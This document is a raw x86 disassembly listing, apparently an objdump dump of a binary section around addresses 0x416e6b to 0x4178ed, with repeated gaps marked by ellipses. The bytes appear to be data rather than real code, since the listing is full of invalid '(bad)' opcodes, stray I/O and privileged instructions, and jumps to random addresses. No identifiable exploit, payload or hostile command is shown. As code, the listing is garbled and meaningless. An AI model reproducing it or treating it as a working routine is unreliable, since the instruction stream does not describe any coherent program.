  416e6b:	pop    ebx
  416e6c:	inc    edi
  416e6d:	inc    ecx
  416e6e:	(bad)  
  416e6f:	jmp    0x416e8c
  416e71:	in     eax,0xd0
  416e73:	dec    ecx
  416e74:	data16 xor al,0xd5
  416e77:	(bad)  
  416e78:	hlt    
  416e79:	push   ebx
  416e7a:	fldl2e 
  416e7c:	and    eax,0x5694a0c1
  416e81:	das    
  416e82:	cld    
  416e83:	test   DWORD PTR [edi+0x5d],0xbb26acab
  416e8a:	ror    BYTE PTR [esi-0x21],cl
  416e8d:	jle    0x416ec4
  416e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e90:	mov    bh,0x0
	...
  416ef2:	add    BYTE PTR [eax],al
  416ef4:	mov    edi,0xae6d8e19
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x18f78eea
  416f02:	dec    edx
  416f03:	dec    esi
  416f04:	jl     0x416ef8
  416f06:	add    BYTE PTR [eax],al
  416f08:	add    eax,0x48000001
  416f0d:	and    ebp,edx
  416f0f:	mov    edi,0xb1a2443e
  416f14:	bound  edx,QWORD PTR [edi]
  416f16:	mov    edx,0xad0c1071
  416f1b:	fs das 
  416f1d:	loop   0x416f0d
  416f1f:	mov    bh,0xd0
  416f21:	test   BYTE PTR [eax+ebx*2],dl
  416f24:	or     BYTE PTR [esi-0x41],cl
  416f27:	inc    esi
  416f28:	clc    
  416f29:	ss push esi
  416f2b:	jae    0x416fa4
  416f2d:	and    eax,0x2a5727be
  416f32:	mov    bl,0x58
  416f34:	dec    BYTE PTR [edx-0x21]
  416f37:	iret   
  416f38:	push   esi
  416f39:	cmovno ebx,edx
  416f3c:	call   0x94d97ca3
  416f41:	add    al,0xae
  416f43:	in     eax,0x63
  416f45:	sbb    edi,DWORD PTR [eax]
  416f47:	push   0x14
  416f49:	mov    eax,edi
  416f4b:	pop    edx
  416f4c:	xchg   esp,eax
  416f4d:	lods   eax,DWORD PTR ds:[esi]
  416f4e:	mov    esp,0xf8747ee3
  416f53:	fsubr  st(6),st
  416f55:	sar    DWORD PTR ds:0x562d413e,cl
  416f5b:	or     edi,DWORD PTR [ecx+eax*2-0x3bda8f38]
  416f62:	je     0x416f8a
  416f64:	out    dx,eax
  416f65:	stos   DWORD PTR es:[edi],eax
  416f66:	add    DWORD PTR [edi+0x4974a28f],ecx
  416f6c:	add    al,0x25
  416f6e:	std    
  416f6f:	or     al,0xeb
  416f71:	push   0x19
  416f73:	jne    0x416f38
  416f75:	rcr    BYTE PTR [esi+0x59],0x51
  416f79:	ins    DWORD PTR es:[edi],dx
  416f7a:	rol    BYTE PTR ds:0x7470851a,0x3
  416f81:	(bad)  
  416f82:	or     al,0xa4
  416f84:	add    cl,BYTE PTR [ebx]
  416f86:	jle    0x416fec
  416f88:	adc    edi,DWORD PTR [ebx]
  416f8a:	loopne 0x416fdc
  416f8c:	xor    esi,esi
  416f8e:	push   edi
  416f8f:	jne    0x416f27
  416f91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f92:	mov    es:0x99addc22,eax
  416f98:	imul   esp,edi,0xffffffc4
  416f9b:	ficom  DWORD PTR [ebp+0x37]
  416f9f:	call   0xd31032d
  416fa4:	mov    edi,0x3df4110d
  416fa9:	sti    
  416faa:	fnsave [eax+0x5b]
  416fad:	cmp    al,0xa1
  416faf:	repz inc ebp
  416fb1:	xor    cl,0x4b
  416fb4:	hlt    
  416fb5:	popf   
  416fb6:	(bad)  [edi]
  416fb8:	in     eax,0x1
  416fba:	js     0x416f9c
  416fbc:	mov    ds:0x461531e1,al
  416fc1:	or     cl,0x44
  416fc4:	imul   edx,ebx,0xffffffdc
  416fc7:	pusha  
  416fc8:	sbb    BYTE PTR [esi+0x9],0x3f
  416fcc:	inc    edi
  416fcd:	leave  
  416fce:	test   eax,0xed1a45be
  416fd3:	adc    al,0xfa
  416fd5:	gs inc ebx
  416fd7:	sbb    BYTE PTR [esi-0x54a584f5],cl
  416fdd:	or     eax,0xa658563f
  416fe2:	pop    ebx
  416fe3:	mov    al,ds:0xf47cd8a
  416fe8:	ds fs inc ebx
  416feb:	(bad)  
  416fec:	jnp    0x417064
  416fee:	rol    BYTE PTR [esi-0x4b948e50],1
  416ff4:	imul   edx,DWORD PTR [ecx+0x64],0x58a0af6f
  416ffb:	push   es
  416ffc:	retf   0xed63
  416fff:	dec    edi
  417000:	mov    edi,0xb5c8030e
  417005:	push   eax
  417006:	dec    esp
  417007:	push   es
  417008:	cmp    al,0x8c
  41700a:	inc    edx
  41700b:	sub    eax,0x73664568
  417010:	sti    
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edx,DWORD PTR [edx+0x59]
  417082:	mov    ds:0xf38109,eax
  417087:	add    BYTE PTR ds:0x8b000001,al
  41708d:	jg     0x4170a3
  41708f:	xlat   BYTE PTR ds:[ebx]
  417091:	push   ebx
  417092:	imul   ebx,ebx,0x4a
  417095:	push   esi
  417096:	scas   al,BYTE PTR es:[edi]
  417097:	imul   DWORD PTR [ecx]
  417099:	dec    edx
  41709a:	jl     0x4170a8
  41709c:	fsub   st(3),st
  41709e:	rcr    DWORD PTR [esp+esi*1-0x3],cl
  4170a2:	jb     0x4170fe
  4170a4:	sbb    bl,BYTE PTR [edx]
  4170a6:	adc    DWORD PTR [esi+0x1b],edx
  4170a9:	pop    edi
  4170aa:	aaa    
  4170ab:	ja     0x417106
  4170ad:	rcl    BYTE PTR [ecx],0xc5
  4170b0:	xor    BYTE PTR [eax-0x6f],ch
  4170b3:	hlt    
  4170b4:	aam    0xd3
  4170b6:	loop   0x4170f9
  4170b8:	fisttp QWORD PTR [edx+0x60]
  4170bb:	jae    0x417125
  4170bd:	adc    DWORD PTR ds:0xc61b861,esp
  4170c3:	or     DWORD PTR [ebx],0x35
  4170c6:	stos   BYTE PTR es:[edi],al
  4170c7:	mov    edi,0x215a4362
  4170cc:	jno    0x417117
  4170ce:	mov    ds:0xc9111350,eax
  4170d3:	mov    BYTE PTR [esi],ah
  4170d5:	mov    ds:0x58e5f3a3,eax
  4170da:	xor    dh,bl
  4170dc:	pop    ss
  4170dd:	mov    al,BYTE PTR [edx]
  4170df:	adc    eax,0x9bfb7457
  4170e4:	add    ch,bh
  4170e6:	mov    al,ds:0x64c03c7b
  4170eb:	stc    
  4170ec:	pop    ebx
  4170ed:	or     al,0x5e
  4170ef:	jmp    0x4170ed
  4170f1:	add    DWORD PTR [ebx],eax
  4170f3:	or     DWORD PTR gs:[esi+ebp*8-0x7c],edi
  4170f8:	clc    
  4170f9:	sbb    al,BYTE PTR [eax-0x538b02d7]
  4170ff:	cli    
  417100:	jge    0x41711f
  417102:	ins    DWORD PTR es:[edi],dx
  417103:	inc    esp
  417104:	push   0x26828dbc
  417109:	sti    
  41710a:	mov    ebx,0xbf911f3e
  41710f:	aas    
  417110:	push   esp
  417111:	mov    esi,0x990c3b8b
  417116:	scas   eax,DWORD PTR es:[edi]
  417117:	arpl   WORD PTR [edi],bx
  417119:	lods   al,BYTE PTR ds:[esi]
  41711a:	dec    eax
  41711b:	push   ebx
  41711c:	idiv   ecx
  41711e:	cmp    DWORD PTR [edi],esp
  417120:	fild   WORD PTR [eax+0x59ce8236]
  417126:	mov    ebp,0x40c4563a
  41712b:	fsubr  QWORD PTR [ebx+0x5daa88b0]
  417131:	ja     0x417116
  417133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417134:	out    0x31,eax
  417136:	adc    eax,0xcaea39e
  41713b:	and    BYTE PTR [edx+0x7e00d44e],bh
  417141:	push   edi
  417142:	clc    
  417143:	sub    BYTE PTR [esi-0x2d67b7e6],0x63
  41714a:	int3   
  41714b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41714c:	enter  0x2a89,0x9d
  417150:	jmp    0x7a18d1b7
  417155:	sub    al,0x23
  417157:	sbb    eax,0x3576d373
  41715c:	int    0x10
  41715e:	stc    
  41715f:	sbb    eax,0xa41ecc09
  417164:	retf   0xc4d7
  417167:	fimul  DWORD PTR [ebx+0x678c9390]
  41716d:	out    0x5c,al
  41716f:	ja     0x417187
  417171:	xchg   BYTE PTR [eax+edx*1+0x6032bc2d],al
  417178:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417179:	add    BYTE PTR [ebx],ah
  41717b:	es inc esp
  41717d:	sub    ebp,DWORD PTR [ebp+eax*4-0x72]
  417181:	adc    ebp,DWORD PTR [eax-0x64bb1ad1]
  417187:	mov    al,ds:0x13b7bccb
  41718c:	mov    dh,0xe1
  41718e:	and    BYTE PTR [ebx+0xcd],bh
	...
  4171f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f5:	sbb    DWORD PTR [eax+0x1a],esi
  4171f8:	(bad)  
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	xor    al,0xda
  417202:	sahf   
  417203:	push   esp
  417204:	xchg   ah,dh
  417206:	add    BYTE PTR [eax],al
  417208:	add    eax,0xd2000001
  41720d:	in     eax,dx
  41720e:	adc    eax,DWORD PTR [ebx-0x2b]
  417211:	out    dx,eax
  417212:	mov    cl,0x5e
  417214:	xchg   ecx,eax
  417215:	adc    edx,DWORD PTR [ecx+0x40]
  417218:	lods   ax,WORD PTR ds:[esi]
  41721a:	rcr    ecx,cl
  41721c:	inc    eax
  41721d:	fldcw  WORD PTR [ebx-0x55]
  417220:	xchg   edi,eax
  417221:	test   eax,0x1d00001c
  417226:	push   edx
  417227:	or     DWORD PTR [edx+esi*1],ebx
  41722a:	xor    ebp,0xffffff85
  41722d:	fdiv   DWORD PTR [edi+0x6426b8ce]
  417233:	je     0x417296
  417235:	xchg   esi,eax
  417236:	test   ah,ch
  417238:	loopne 0x417291
  41723a:	je     0x417290
  41723c:	xchg   esi,eax
  41723d:	and    eax,0x53a9c103
  417242:	mov    al,0x37
  417244:	push   esp
  417245:	cmp    dl,BYTE PTR [ebp-0xe]
  417248:	add    ch,BYTE PTR [edi]
  41724a:	and    BYTE PTR [esi],ch
  41724c:	test   eax,0xad340d7
  417251:	cmp    BYTE PTR [esi+0x29],dl
  417254:	pop    ebp
  417255:	shl    DWORD PTR [ebp+0x629bb4fa],0xc8
  41725c:	push   edi
  41725d:	inc    BYTE PTR [ebx+0x7d]
  417260:	push   ss
  417261:	std    
  417262:	test   eax,0xbd71f13c
  417267:	xor    al,0x96
  417269:	fs cli 
  41726b:	mov    ch,0x3c
  41726d:	das    
  41726e:	mov    edi,0x31d32dbc
  417273:	ror    edx,0x6b
  417276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417277:	cmp    BYTE PTR [ecx+0x9],0x2a
  41727b:	imul   esp,DWORD PTR [ebx],0xd
  41727e:	imul   eax,edi,0xbb6a2c34
  417284:	mov    WORD PTR [edx],cs
  417286:	ret    0x31eb
  417289:	leave  
  41728a:	(bad)  
  41728b:	and    al,0xce
  41728d:	cmp    eax,0xf7555cc3
  417292:	xchg   ebp,eax
  417293:	jnp    0x4172be
  417295:	ret    
  417296:	sub    BYTE PTR [ebx-0x37],bl
  417299:	leave  
  41729a:	dec    edx
  41729b:	leave  
  41729c:	add    BYTE PTR [eax-0x5d],dl
  41729f:	enter  0xbdd6,0x44
  4172a3:	clc    
  4172a4:	outs   dx,BYTE PTR ds:[esi]
  4172a5:	jp     0x417284
  4172a7:	nop
  4172a8:	stos   DWORD PTR es:[edi],eax
  4172a9:	jb     0x41726f
  4172ab:	cs (bad) 
  4172ad:	sub    DWORD PTR [esi+eiz*8-0x2a],eax
  4172b1:	jo     0x4172d4
  4172b3:	arpl   WORD PTR [ecx-0xf9f2c67],bx
  4172b9:	stos   DWORD PTR es:[edi],eax
  4172ba:	jns    0x417305
  4172bc:	int3   
  4172bd:	add    DWORD PTR [eax-0x33b9a2e8],esi
  4172c3:	jmp    0xdf86:0x9451a952
  4172ca:	sub    DWORD PTR [eax],ebx
  4172cc:	outs   dx,BYTE PTR ds:[esi]
  4172cd:	repnz sbb esp,DWORD PTR fs:[ebp-0x43]
  4172d2:	sbb    eax,edi
  4172d4:	das    
  4172d5:	jbe    0x41725f
  4172d7:	fidiv  DWORD PTR [ecx+0x62]
  4172da:	shl    BYTE PTR [esi-0x72e9f0b7],cl
  4172e0:	ret    
  4172e1:	xchg   DWORD PTR [ebp-0x2a839eb2],edi
  4172e7:	sbb    eax,0xc15f7be8
  4172ec:	imul   ebx,DWORD PTR [edi+0x11bbe4da],0xa96a486a
  4172f6:	dec    ebx
  4172f7:	aad    0x73
  4172f9:	ret    0xb60f
  4172fc:	pop    ebx
  4172fd:	pop    esp
  4172fe:	stos   DWORD PTR es:[edi],eax
  4172ff:	pusha  
  417300:	mov    ecx,DWORD PTR [esi-0x36fb5fe5]
  417306:	cs pop edx
  417308:	sub    edx,edx
  41730a:	pop    esi
  41730b:	jb     0x417359
  41730d:	xlat   BYTE PTR ds:[ebx]
  41730e:	jecxz  0x417307
  417310:	add    BYTE PTR [bx+si],al
	...
  417373:	add    BYTE PTR [ecx-0x44],ch
  417376:	xlat   BYTE PTR ds:[ebx]
  417377:	pop    esi
  417378:	xlat   BYTE PTR ds:[ebx]
  417379:	jg     0x417364
  41737b:	mov    edi,0x6508016b
  417380:	sar    bl,cl
  417382:	dec    esi
  417383:	leave  
  417384:	mov    esi,ebp
  417386:	add    BYTE PTR [eax],al
  417388:	add    eax,0x47000001
  41738d:	test   DWORD PTR [ebx],ecx
  41738f:	pop    esi
  417390:	dec    ebx
  417391:	int3   
  417392:	inc    ebx
  417393:	push   ds
  417394:	test   BYTE PTR [ebx+0x5e22adf6],ch
  41739a:	or     dl,BYTE PTR [ecx-0x5e66043a]
  4173a0:	adc    eax,0x87cab3e
  4173a5:	inc    esi
  4173a6:	aaa    
  4173a7:	xchg   ebp,eax
  4173a8:	mov    eax,0x151d6db3
  4173ad:	cmp    esi,esp
  4173af:	fs sbb al,0xa8
  4173b2:	aaa    
  4173b3:	ds inc edi
  4173b5:	or     ebp,DWORD PTR [esi+0x1177891]
  4173bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173bc:	loop   0x417374
  4173be:	pop    es
  4173bf:	mov    al,BYTE PTR [ecx+0x57]
  4173c2:	inc    esp
  4173c3:	or     BYTE PTR [edi+0x21c83950],0x33
  4173ca:	in     eax,0xa8
  4173cc:	mov    ch,0x7
  4173ce:	dec    edi
  4173cf:	inc    ebp
  4173d0:	(bad)  
  4173d1:	arpl   WORD PTR [eax+0x31fec665],dx
  4173d7:	in     eax,dx
  4173d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173d9:	xor    DWORD PTR [edi],ebx
  4173db:	(bad)  
  4173dd:	nop
  4173de:	les    esp,FWORD PTR [edi+ebx*1]
  4173e1:	fcmovb st,st(6)
  4173e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e4:	pop    esp
  4173e5:	xor    dh,bh
  4173e7:	and    DWORD PTR [edx+0x56],ebp
  4173ea:	js     0x4173e6
  4173ec:	gs (bad) 
  4173ef:	outs   dx,DWORD PTR ds:[esi]
  4173f0:	shl    DWORD PTR [ebx-0x3fbe3688],cl
  4173f6:	add    BYTE PTR [ecx],ah
  4173f8:	jg     0x4173e7
  4173fa:	es stc 
  4173fc:	test   DWORD PTR [eax+0x2],0x776205b2
  417403:	cmp    DWORD PTR [eax-0x9],ecx
  417406:	or     ch,BYTE PTR [eax]
  417408:	cmp    bl,ah
  41740a:	imul   edx,esp,0x5aaf9eba
  417410:	cmp    BYTE PTR [ecx],bl
  417412:	out    0xbb,al
  417414:	xchg   edi,eax
  417415:	xor    DWORD PTR [ecx+0x51e01b21],esi
  41741b:	aad    0x9
  41741d:	ss mov ecx,0x46d2b2a3
  417423:	pop    eax
  417424:	pop    edx
  417425:	push   ss
  417426:	mov    eax,ds:0xd6e8577b
  41742b:	mov    dl,0x2a
  41742d:	sub    BYTE PTR fs:[ebp-0x44034b5c],ch
  417434:	addps  xmm3,XMMWORD PTR [edi-0x7ac854e2]
  41743b:	mov    BYTE PTR ds:0xb2bca788,dh
  417441:	push   es
  417442:	mov    dl,0xca
  417444:	jge    0x417494
  417446:	or     DWORD PTR [ebp+0x5f],ebx
  417449:	data16 xor al,0x9
  41744c:	mov    DWORD PTR [edi+0x68c47728],ebp
  417452:	sti    
  417453:	(bad)  
  417454:	(bad)  
  417456:	jge    0x417421
  417458:	jl     0x417475
  41745a:	test   BYTE PTR [esi+0x208de5c7],ah
  417460:	sbb    eax,0xa34bbf37
  417465:	test   BYTE PTR [eax],al
  417467:	call   0xbb68:0x3774481a
  41746e:	cdq    
  41746f:	lock dec eax
  417471:	outs   dx,DWORD PTR ds:[esi]
  417472:	cdq    
  417473:	cld    
  417474:	xor    al,0x74
  417476:	inc    esp
  417477:	ret    
  417478:	hlt    
  417479:	clc    
  41747a:	(bad)
  41747d:	cmp    eax,0x8ccabbf0
  417482:	fst    DWORD PTR [edi+0x6f03f6c2]
  417488:	jmp    0x26f4dddb
  41748d:	xor    al,BYTE PTR [eax]
  41748f:	adc    BYTE PTR [ecx+0x0],ch
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	pop    ss
  417501:	push   es
  417502:	aas    
  417503:	jb     0x417495
  417505:	test   BYTE PTR [eax],0x0
  417508:	add    eax,0xdb000001
  41750d:	sbb    bl,0xa4
  417510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417511:	inc    edx
  417512:	add    dh,bh
  417514:	cld    
  417515:	xchg   edx,eax
  417516:	mov    eax,ds:0x32cda0d4
  41751b:	ror    BYTE PTR [esi],1
  41751d:	test   dh,al
  41751f:	es addr16 inc eax
  417522:	inc    ebp
  417523:	and    esp,DWORD PTR [ecx+0x33]
  417526:	mov    edi,0x8d1e6f75
  41752b:	adc    BYTE PTR [edi+0x5],cl
  41752e:	inc    ebp
  41752f:	cld    
  417530:	jae    0x41759b
  417532:	or     al,0x24
  417534:	hlt    
  417535:	jmp    0x417578
  417537:	repz add esi,ebx
  41753a:	pusha  
  41753b:	push   esi
  41753c:	cdq    
  41753d:	pop    ecx
  41753e:	(bad)  
  41753f:	int    0xf4
  417541:	cli    
  417542:	cmp    eax,0x63d4a0c9
  417547:	cmc    
  417548:	jae    0x417576
  41754a:	bound  esp,QWORD PTR [ebx]
  41754c:	xor    eax,0x1884c651
  417551:	call   0x2aeb889b
  417556:	gs push edi
  417558:	repnz sbb DWORD PTR [edx-0x1224f196],ebx
  41755f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417560:	cmp    al,0x0
  417562:	add    DWORD PTR [edx-0x4db1f14d],ebx
  417568:	scas   al,BYTE PTR es:[di]
  41756a:	pop    ebx
  41756b:	mov    eax,0x69ccae3e
  417570:	mov    ecx,eax
  417572:	jnp    0x4175b4
  417574:	adc    DWORD PTR [ecx],0x478a4266
  41757a:	or     ecx,DWORD PTR [ecx]
  41757c:	lods   eax,DWORD PTR ds:[esi]
  41757d:	push   cs
  41757e:	inc    esp
  41757f:	adc    dh,bh
  417581:	push   bx
  417583:	leave  
  417584:	mov    ds:0x215a15de,al
  417589:	in     al,0x8d
  41758b:	push   DWORD PTR gs:[ebp-0x426116d6]
  417592:	loope  0x417522
  417594:	adc    BYTE PTR [edi-0x55],bh
  417597:	mov    edi,0x7013985d
  41759c:	and    DWORD PTR ds:0xe103fc44,ebp
  4175a2:	jb     0x41757f
  4175a4:	(bad)  
  4175a5:	call   0x44a01a2c
  4175aa:	xchg   BYTE PTR [eax-0x26],al
  4175ad:	(bad)  
  4175ae:	pop    esp
  4175af:	ins    DWORD PTR es:[edi],dx
  4175b0:	aad    0x1
  4175b2:	mov    ah,BYTE PTR [ecx]
  4175b4:	and    DWORD PTR [esi-0x58],ecx
  4175b7:	or     BYTE PTR [ecx-0x51],dl
  4175ba:	xlat   BYTE PTR ds:[ebx]
  4175bb:	add    DWORD PTR [edi],ebx
  4175bd:	jno    0x41759b
  4175bf:	jno    0x417549
  4175c1:	ds (bad) 
  4175c3:	shr    bh,cl
  4175c5:	std    
  4175c6:	mov    ch,0x1a
  4175c8:	pop    ebp
  4175c9:	rol    esi,0xfb
  4175cc:	data16 aas 
  4175ce:	cmp    esp,DWORD PTR [ecx+ebp*1]
  4175d1:	ins    BYTE PTR es:[edi],dx
  4175d2:	retf   
  4175d3:	push   ecx
  4175d4:	adc    ah,BYTE PTR [edx]
  4175d6:	mov    edi,0x7167b9a6
  4175db:	mov    ebp,0xe087aa89
  4175e0:	and    ebp,DWORD PTR cs:[ebx-0x6b2fbe39]
  4175e7:	and    ch,BYTE PTR [esi+edi*4-0x70ffde57]
  4175ee:	mov    edx,0x788f0674
  4175f3:	outs   dx,BYTE PTR ds:[esi]
  4175f4:	sbb    BYTE PTR [eax+esi*1-0x19],bl
  4175f8:	sbb    DWORD PTR [ecx-0x483d7ba1],eax
  4175fe:	sbb    al,0xb7
  417600:	xor    DWORD PTR [esi-0x6dc0eca9],ecx
  417606:	mov    bl,0x74
  417608:	rcr    bl,cl
  41760a:	mov    ?,esi
  41760c:	or     al,0x8a
  41760e:	xor    DWORD PTR [edx+0x5e],0x0
	...
  417672:	add    BYTE PTR [eax],al
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	fiadd  DWORD PTR [edi-0x3b]
  417682:	fcom   DWORD PTR ss:[ebp+0x50000f7]
  417689:	add    DWORD PTR [eax],eax
  41768b:	add    BYTE PTR [edi-0x569c6210],ah
  417691:	mov    edi,0x2faffb9c
  417696:	dec    esp
  417697:	icebp  
  417698:	push   es
  417699:	pop    ebx
  41769a:	push   ebp
  41769b:	or     bl,ch
  41769d:	mov    eax,ds:0x7cf28999
  4176a2:	or     ebx,DWORD PTR [ecx]
  4176a4:	loope  0x417642
  4176a6:	jb     0x41768b
  4176a8:	fwait
  4176a9:	sbb    eax,0xb3b9b8bd
  4176ae:	pop    ebx
  4176af:	sbb    cl,BYTE PTR [esi]
  4176b1:	add    al,0x14
  4176b3:	xchg   edi,ecx
  4176b5:	fnstenv [eax-0x1]
  4176b8:	sbb    dl,BYTE PTR [esi-0x39ad7fa]
  4176be:	test   eax,0x93736cc0
  4176c3:	sbb    al,0xe8
  4176c5:	mov    ah,0xa1
  4176c7:	ss popf 
  4176c9:	sub    al,0xee
  4176cb:	inc    edx
  4176cc:	mov    ah,0xad
  4176ce:	aam    0x5
  4176d0:	jecxz  0x417673
  4176d2:	jmp    0x30b0:0x7c0d1af
  4176d9:	and    al,0xbf
  4176db:	sub    DWORD PTR [edi],ebp
  4176dd:	imul   esp,DWORD PTR [ebx-0xf19adbb],0xffffffec
  4176e4:	fstp   st(3)
  4176e6:	out    dx,eax
  4176e7:	lock jnp 0x4176ad
  4176ea:	inc    esi
  4176eb:	fwait
  4176ec:	xchg   esi,eax
  4176ed:	in     al,dx
  4176ee:	sbb    esi,DWORD PTR [ebx-0x4d15dcb7]
  4176f4:	xor    dh,BYTE PTR [ebp+0x8]
  4176f7:	adc    DWORD PTR [esi+0x75],ebx
  4176fa:	pop    edx
  4176fb:	ret    0xd5db
  4176fe:	and    eax,0x93bb67c8
  417703:	sub    eax,0xcb3f5068
  417708:	retf   0x54a9
  41770b:	test   DWORD PTR [edi+0x4a],edx
  41770e:	pop    edx
  41770f:	dec    esi
  417710:	xor    BYTE PTR [ebx-0x40],bl
  417713:	pop    es
  417714:	lds    edx,FWORD PTR [eax+0x8d0eb78]
  41771a:	ss into 
  41771c:	jae    0x4176ed
  41771e:	out    dx,al
  41771f:	ret    
  417720:	in     al,0x64
  417722:	mov    al,0x56
  417724:	sbb    ch,bh
  417726:	xor    eax,0xc188f832
  41772b:	sub    BYTE PTR [esi],0xdc
  41772e:	imul   ecx,DWORD PTR [edx],0xffffffc6
  417731:	dec    ebp
  417732:	and    dh,cl
  417734:	xor    al,bl
  417736:	ins    BYTE PTR es:[edi],dx
  417737:	and    BYTE PTR [edi+0x36],dh
  41773a:	mov    WORD PTR [eax],gs
  41773c:	rol    BYTE PTR [edi-0x5734f06f],1
  417742:	ret    0xaddf
  417745:	fild   QWORD PTR [esi+0xf54b5f7]
  41774b:	xor    al,0x4b
  41774d:	xchg   esi,eax
  41774e:	neg    DWORD PTR [ebx]
  417750:	popa   
  417751:	iret   
  417752:	or     eax,0x440510c8
  417757:	ins    BYTE PTR es:[edi],dx
  417758:	inc    edi
  417759:	es (bad) 
  41775b:	mov    ds:0x95eb8d6d,al
  417760:	jecxz  0x4177dd
  417762:	mov    dl,bh
  417764:	sub    al,0xac
  417766:	jecxz  0x41778f
  417768:	lods   eax,DWORD PTR ds:[esi]
  417769:	push   ebx
  41776a:	cdq    
  41776b:	gs push ebx
  41776d:	mov    gs,WORD PTR [edx-0x62]
  417770:	test   BYTE PTR [ecx+0x6b],0xa
  417774:	out    dx,al
  417775:	add    esi,DWORD PTR [ebx+ecx*8]
  417778:	fild   QWORD PTR [ecx+0x4730de48]
  41777e:	stos   DWORD PTR es:[edi],eax
  41777f:	loop   0x4177b7
  417781:	push   cs
  417782:	outs   dx,BYTE PTR ds:[esi]
  417783:	mov    eax,ds:0xd818cbdd
  417788:	daa    
  417789:	xchg   edx,eax
  41778a:	fisttp WORD PTR [edx]
  41778c:	push   ebp
  41778d:	aaa    
  41778e:	pop    esp
  41778f:	clc    
  417790:	add    BYTE PTR [eax],0x0
	...
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [ecx-0x65be7e22],cl
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    eax,0xd9000001
  41780d:	mov    al,BYTE PTR [esi+0x21fe5292]
  417813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417814:	jmp    0x41780b
  417816:	scas   al,BYTE PTR es:[edi]
  417817:	push   esi
  417818:	mov    bh,0x68
  41781a:	pushf  
  41781b:	mov    bh,0xf0
  41781d:	imul   ebx,DWORD PTR [ebx],0x1a8da5fd
  417823:	jns    0x417871
  417825:	(bad)  
  417826:	in     al,dx
  417827:	mov    ecx,0x172bd2c8
  41782c:	hlt    
  41782d:	in     eax,dx
  41782e:	in     eax,dx
  41782f:	mov    bl,0xa9
  417831:	int3   
  417832:	and    DWORD PTR [edx-0x7a1671b7],edi
  417838:	in     al,0xd6
  41783a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783b:	and    al,cl
  41783d:	xlat   BYTE PTR ds:[ebx]
  41783e:	jge    0x417898
  417840:	jmp    0xa2be77b3
  417845:	or     esp,DWORD PTR [edi+0x7bde866f]
  41784b:	xor    dh,cl
  41784d:	imul   esi,DWORD PTR [esi-0x27b10c2c],0x11
  417854:	mov    DWORD PTR [ebx],edi
  417856:	in     eax,dx
  417857:	aad    0xbf
  417859:	mov    bh,BYTE PTR [esi]
  41785b:	rol    DWORD PTR [ebx-0x80],cl
  41785e:	xchg   ebx,eax
  41785f:	inc    edi
  417860:	pop    esp
  417861:	into   
  417862:	repnz xchg ebp,eax
  417864:	sub    esp,edx
  417866:	mov    dh,BYTE PTR es:[edx-0x3e]
  41786a:	pop    eax
  41786b:	pop    edx
  41786c:	repz retf 
  41786e:	arpl   WORD PTR [edi],bp
  417870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417872:	xor    BYTE PTR [ebx+ecx*8-0x4400b74d],ah
  417879:	call   0xa114:0xac87681b
  417880:	nop
  417881:	push   edx
  417882:	(bad)  
  417883:	in     eax,0xc4
  417885:	ret    
  417886:	jmp    0x417856
  417888:	nop
  417889:	hlt    
  41788a:	ret    0x8b9b
  41788d:	inc    ecx
  41788e:	aad    0x44
  417890:	mov    esp,0x1a60f0dc
  417895:	or     ebx,edi
  417897:	repnz and al,0xb0
  41789a:	(bad)  
  41789b:	out    0x44,eax
  41789d:	xchg   ebx,eax
  41789f:	adc    eax,0xe355c5e1
  4178a4:	xchg   edx,eax
  4178a5:	(bad)  
  4178a7:	jl     0x41786d
  4178a9:	push   ecx
  4178aa:	ret    
  4178ab:	loop   0x4178d5
  4178ad:	jmp    0xfcb1:0x53615f5b
  4178b4:	xor    bh,BYTE PTR [ecx]
  4178b6:	inc    ecx
  4178b7:	sbb    ebp,DWORD PTR [ebx+esi*1]
  4178ba:	aad    0x2f
  4178bc:	bound  eax,QWORD PTR [ebx]
  4178be:	adc    eax,0xae6d37d7
  4178c3:	cmovnp esi,ecx
  4178c6:	cmp    eax,0xb216596b
  4178cb:	sbb    eax,0x57507512
  4178d0:	add    eax,0xed9db52e
  4178d5:	dec    esi
  4178d6:	sub    BYTE PTR [ebx+0x70],bh
  4178d9:	mov    bl,0xd8
  4178db:	jecxz  0x417955
  4178dd:	arpl   cx,bx
  4178df:	cmp    al,0x65
  4178e1:	inc    esp
  4178e2:	cmp    ch,BYTE PTR [eax]
  4178e4:	ins    BYTE PTR es:[edi],dx
  4178e5:	cmp    al,0x90
  4178e7:	(bad)  
  4178e8:	shl    bh,1
  4178ea:	test   BYTE PTR [edx-0x14],bh
  4178ed:	xor    al,0x80
